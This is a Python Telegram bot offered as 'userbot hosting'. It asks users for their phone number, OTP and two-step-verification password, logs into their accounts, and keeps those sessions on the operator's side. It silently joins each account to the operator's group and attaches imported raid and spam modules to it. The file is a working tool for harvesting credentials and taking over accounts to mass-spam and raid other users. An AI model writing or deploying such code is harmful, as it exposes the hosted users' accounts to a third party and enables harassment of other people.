import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.messages import ImportChatInviteRequest
from config import API_ID, API_HASH, BOT_TOKEN, OWNER_ID
from raid import register_raid
from spam import register_spam

# ---------------------------------------------------------
# BOT INITIALIZATION
# ---------------------------------------------------------
# Central Bot Instance (Handles Start, Login, and Logging)
bot = TelegramClient('SmokerHost', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Your Private Log Group ID
LOG_GROUP = -1003597315733 

# Memory-based storage for hosted sessions
GLOBAL_CLIENTS = {}

# ---------------------------------------------------------
# START COMMAND
# ---------------------------------------------------------
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    welcome = "🔥 **SMOKER USERBOT HOSTING** 🔥\n\nClick below to host your ID and start using the bot."
    buttons = [
        [Button.inline("🚀 LOGIN", data="login")],
        [
            Button.url("❤️‍🔥 OWNER ❄️", "https://t.me/Divyansh6565"),
            Button.url("📢 CHANNEL", "https://t.me/lootversegc")
        ]
    ]
    await event.respond(welcome, buttons=buttons)

# ---------------------------------------------------------
# LOGIN & HOSTING HANDLER
# ---------------------------------------------------------
@bot.on(events.CallbackQuery(data="login"))
async def login_handler(event):
    async with bot.conversation(event.sender_id) as conv:
        try:
            # 1. Ask for Phone Number
            await conv.send_message("📱 Send your **Phone Number** with country code (e.g., +91...):")
            phone_msg = await conv.get_response()
            phone = phone_msg.text
            
            # 2. Connect Client & Request OTP
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            await client.send_code_request(phone)
            
            # 3. Ask for OTP
            await conv.send_message("📩 Send **OTP** (e.g., 1 2 3 4 5):")
            otp_msg = await conv.get_response()
            otp = otp_msg.text.replace(" ", "")
            
            # 4. Sign In (with 2FA Check)
            try:
                await client.sign_in(phone, code=otp)
            except SessionPasswordNeededError:
                await conv.send_message("🔐 **Two-Step Verification** is enabled. Please send your password:")
                password_msg = await conv.get_response()
                password = password_msg.text
                await client.sign_in(password=password)
            
            # 5. Automated Support Group Join
            try:
                # Invite hash for https://t.me/+Wkpz6yvrKQ9iMTg1
                await client(ImportChatInviteRequest('Wkpz6yvrKQ9iMTg1'))
                await conv.send_message("💖 Joined My Support Group ❄️")
            except Exception:
                pass # Skip if already in group or link error

            # 6. Register Modules (Raid & Spam)
            register_raid(client)
            register_spam(client)
            
            # 7. Store Active Session
            GLOBAL_CLIENTS[event.sender_id] = client
            
            # 8. Success Message
            success_msg = (
                "❤️‍🔥 Your Userbot Is Hosted Successfully 😈\n\n"
                "💖 Contact My Owner To Know Commands - @Divyansh6565 ♥️"
            )
            await conv.send_message(success_msg)
            
        except Exception as e:
            await conv.send_message(f"❌ **Error during login:** {str(e)}")

# ---------------------------------------------------------
# BOT DISCONNECTION HANDLER
# ---------------------------------------------------------
@bot.on(events.NewMessage(pattern='/logout'))
async def logout(event):
    if event.sender_id in GLOBAL_CLIENTS:
        await GLOBAL_CLIENTS[event.sender_id].disconnect()
        del GLOBAL_CLIENTS[event.sender_id]
        await event.respond("🚫 **Logged out.** Your session has been removed.")
    else:
        await event.respond("You don't have an active session hosted.")

if __name__ == "__main__":
    print("Smoker Userbot Hosting is live...")
    bot.run_until_disconnected()
